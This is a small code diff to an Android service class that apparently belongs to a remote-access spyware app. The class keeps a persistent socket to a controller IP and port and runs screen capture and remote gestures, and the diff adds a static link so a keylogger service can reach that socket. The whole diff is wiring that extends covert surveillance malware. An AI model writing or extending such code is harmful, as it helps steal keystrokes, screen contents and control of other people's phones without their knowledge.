@@ -38,12 +38,23 @@ public class MyService extends Service {
     String MY_IP,MY_PORT ;
     private final long reconnectTime = 1*1000;
     public static Socket sock=null;  // Made public static so Keylogger can access
+    private static Keylogger keyloggerInstance; // Static reference to Keylogger service
     public MediaProjectionManager mProjectionManager;
     public MediaProjection mProjection;
     Capture capture;
     Handler handler = new Handler();
     Handler gestureHandler = new Handler();
     Pinger pinger = new Pinger();
+    
+    // Helper method to get Keylogger service instance
+    private Keylogger getKeyloggerServiceInstance() {
+        return keyloggerInstance;
+    }
+    
+    // Method to set Keylogger instance from Keylogger service
+    public static void setKeyloggerInstance(Keylogger keylogger) {
+        keyloggerInstance = keylogger;
+    }
 
     @RequiresApi(api = Build.VERSION_CODES.O)
     @Override
@@ -298,4 +309,3 @@ public class MyService extends Service {
         super.onDestroy();
     }
 }
-```
